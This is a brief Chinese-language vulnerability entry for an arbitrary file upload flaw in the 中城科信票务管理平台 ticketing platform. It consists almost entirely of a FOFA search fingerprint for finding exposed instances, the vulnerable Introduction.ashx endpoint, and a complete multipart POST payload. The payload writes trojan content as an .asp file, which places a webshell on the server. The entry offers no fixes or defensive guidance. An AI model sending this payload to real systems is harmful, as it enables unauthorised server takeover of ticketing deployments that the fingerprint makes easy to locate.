# 中城科信票务管理平台存在Introduction.ashx任意文件上传漏洞

- **系统**：中城科信票务管理平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`FOFA：body="SystemManager/SoftwareLicense.htm"`
- **请求**：`POST /SystemManager/Introduction.ashx HTTP/1.1`
- **关键头**：`Host: 地址`　`Content-Length: 2215`　`Content-Type: multipart/form-data; boundary=--------------------------3545…`

**请求体 / payload**
```
----------------------------354575237365372692397370
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: image/jpeg
木马内容
----------------------------354575237365372692397370
Content-Disposition: form-data; name="fileName"
1.asp
----------------------------354575237365372692397370
Content-Disposition: form-data; name="Method"
UpdateUploadLinkPic
----------------------------354575237365372692397370
```